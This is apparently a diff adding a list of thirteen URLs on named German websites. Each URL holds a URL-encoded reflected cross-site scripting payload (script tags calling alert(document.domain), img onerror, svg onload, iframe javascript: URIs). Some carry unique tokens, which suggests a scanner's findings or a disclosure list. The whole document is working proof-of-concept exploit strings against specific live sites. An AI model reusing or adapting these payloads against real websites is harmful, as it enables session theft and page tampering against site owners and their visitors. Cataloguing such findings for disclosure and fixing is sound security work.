@@ -1,0 +1,13 @@
+http://fiduscom.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://filges-it-beratung.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://friedrich-u-maier.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://fwg-freiburg.de/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C%2Fh1%3E%3Cscript%3Ealert(/2NFF3UpuFNW20dO99stBwvbZxHg/)%3C%2Fscript%3E
+http://fwgisa.fwg.fr.bw.schule.de/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%272NFF3R9h63NsM4Y04Se3fIA6AVy%27)%3C/script%3E
+http://garagentreff.yooco.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://freiburg-zone.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://friedberg-journal.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://friedberg-rundschau.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+https://friedrichsdorf-tageblatt.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://friedrichshafen-rundschau.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+https://galerie.flohuber.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+https://gamesforleague.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
